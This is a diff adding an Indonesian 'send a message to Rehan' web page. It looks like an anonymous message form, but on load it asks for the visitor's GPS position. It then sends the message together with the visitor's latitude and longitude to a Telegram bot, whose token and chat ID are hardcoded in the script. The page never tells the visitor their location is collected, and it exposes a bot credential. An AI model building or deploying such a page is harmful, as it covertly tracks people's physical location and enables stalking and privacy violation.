@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kirim Pesan ke Rehan</title>
+
+<style>
+    body {
+        margin: 0;
+        background: #1d4ed8;
+        font-family: Arial, sans-serif;
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        backdrop-filter: blur(6px);
+    }
+
+    .card {
+        background: rgba(255, 255, 255, 0.15);
+        padding: 20px;
+        width: 90%;
+        max-width: 400px;
+        border-radius: 10px;
+        text-align: center;
+    }
+
+    textarea {
+        width: 100%;
+        height: 100px;
+        padding: 10px;
+        border: none;
+        border-radius: 8px;
+        resize: none;
+        font-size: 15px;
+    }
+
+    button {
+        margin-top: 10px;
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        background: #ffffff;
+        color: #1d4ed8;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    #status {
+        margin-top: 10px;
+        font-size: 14px;
+    }
+</style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Kirim Pesan ke Rehan</h2>
+    <textarea id="pesan" placeholder="Tulis pesan di sini..."></textarea>
+    <button onclick="kirimPesan()">Kirim</button>
+    <div id="status"></div>
+</div>
+
+<script>
+const BOT_TOKEN = "8460626408:AAH1-67wDVP06frJylVhwLBj2F6Ep7lUtvU";
+const CHAT_ID  = "7508766509";
+
+let gpsLokasi = "GPS tidak diizinkan";
+
+// ======= Minta Izin GPS Saat Web Dibuka =======
+window.onload = () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                gpsLokasi = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
+            },
+            () => {
+                gpsLokasi = "User menolak izin GPS";
+            }
+        );
+    }
+};
+
+// ======= Fungsi Kirim ke Telegram =======
+async function kirimPesan() {
+    const pesan = document.getElementById("pesan").value.trim();
+    const status = document.getElementById("status");
+
+    if (!pesan) {
+        status.innerHTML = "Tulis pesan dulu.";
+        return;
+    }
+
+    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+    const text = 
+`<b>Pesan Baru Untuk Rehan</b>
+
+📝 Pesan:
+${pesan}
+
+🕒 Waktu: ${waktu}
+📍 Lokasi: ${gpsLokasi}`;
+
+    status.innerHTML = "Mengirim...";
+
+    try {
+        const respon = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            })
+        });
+
+        const data = await respon.json();
+
+        if (data.ok) {
+            status.innerHTML = "Pesan terkirim!";
+            document.getElementById("pesan").value = "";
+        } else {
+            status.innerHTML = "Gagal mengirim pesan.";
+        }
+
+    } catch (e) {
+        status.innerHTML = "Gagal mengirim pesan.";
+    }
+}
+</script>
+</body>
+</html>
